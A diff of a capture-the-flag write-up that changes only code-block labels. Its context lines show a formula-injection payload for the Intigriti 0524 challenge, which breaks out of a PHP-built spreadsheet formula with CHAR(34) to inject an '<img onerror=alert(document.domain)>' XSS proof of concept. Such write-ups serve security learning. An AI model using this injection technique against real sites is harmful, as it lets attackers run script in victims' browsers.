@@ -26,7 +26,7 @@ Let me walk you through my entire thought process from start to finish.
 
 The challenge was hosted at:
 
-```
+```text title="url"
 https://challenge-0524.intigriti.io/challenge.php
 ```
 
@@ -152,7 +152,7 @@ Works perfectly. The discriminant would be `(-5)² - 4(1)(6) = 25-24 = 1`, and t
 
 Since the input goes directly into the formula, I tried injecting spreadsheet formula syntax through `C`. My first test was:
 
-```
+```text title="input → C"
 C = 1)&"INJECTED"&(1
 ```
 
@@ -160,7 +160,7 @@ The idea was to break out of the `POWER()` function call in the discriminant for
 
 So the discriminant formula would become:
 
-```
+```text title="resulting formula"
 =POWER(1,2) - (4 * 1 * 1)&"INJECTED"&(1)
 ```
 
@@ -192,7 +192,7 @@ The trick is **`CHAR(34)`** — the spreadsheet function that returns the charac
 
 After a lot of trial and error (and maybe a cup of chai), I came up with this payload for parameter `C`:
 
-```
+```text title="payload → C"
 1)&"0)),2*1)&"&CHAR(34)&"<img src=x onerror=alert(document.domain)>"&CHAR(34)&"&IMDIV(IMSUM(0,IMSQRT("&(0
 ```
 
@@ -204,7 +204,7 @@ I know it looks like absolute chaos, but let me break it down step by step.
 
 The discriminant formula becomes:
 
-```
+```text title="resulting formula"
 =POWER(1,2) - (4 * 1 * 1)&"0)),2*1)&"&CHAR(34)&"<img src=x onerror=alert(document.domain)>"&CHAR(34)&"&IMDIV(IMSUM(0,IMSQRT("&(0)
 ```
 
@@ -220,7 +220,7 @@ Let's trace what happens:
 
 So the discriminant evaluates to a string like:
 
-```
+```text title="payload → C"
 -30)),2*1)&"<img src=x onerror=alert(document.domain)>"&IMDIV(IMSUM(0,IMSQRT(0
 ```
 
@@ -234,7 +234,7 @@ $r1Formula = '=IMDIV(IMSUM(-1,IMSQRT(' . $discriminant . ')),2 * 1)';
 
 Which becomes:
 
-```
+```text title="resulting formula"
 =IMDIV(IMSUM(-1,IMSQRT(-30)),2*1)&"<img src=x onerror=alert(document.domain)>"&IMDIV(IMSUM(0,IMSQRT(0)),2 * 1)
 ```
 
@@ -246,7 +246,7 @@ Notice how the `"` characters from `CHAR(34)` now act as **string delimiters** i
 
 The output is:
 
-```
+```text title="rendered output"
 -0.5+2.7386127875259i<img src=x onerror=alert(document.domain)>0.0
 ```
 
